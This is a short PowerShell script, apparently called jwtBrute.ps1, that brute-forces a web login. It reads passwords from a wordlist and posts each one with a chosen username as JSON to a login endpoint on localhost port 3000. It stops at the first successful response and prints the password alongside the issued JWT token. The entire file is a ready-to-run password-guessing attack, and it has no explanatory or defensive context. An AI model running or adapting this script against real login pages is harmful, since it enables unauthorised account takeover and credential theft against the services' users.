$passwords = Get-Content $args[0]

for ($i = 0; $i -lt $passwords.Length; $i++) {
    $pass = $passwords[$i].Trim()
    $body = @{username=$args[1]; password=$pass} | ConvertTo-Json -Compress

    try{
        $response = Invoke-WebRequest -Uri "http://localhost:3000/login" `
            -Method Post `
            -Headers @{"Content-Type"="application/json"} `
            -Body $body -ErrorAction Stop
    } catch{

    }

    if ($response.StatusCode -eq 200) {
        $jwt = ($response.Content | ConvertFrom-Json).token
        if ($jwt) {
            Write-Output "$pass : $jwt"
        } 
        break
    }
}

# use this script like: ./jwtBrute.ps1 "\path\to\wordlist" "username"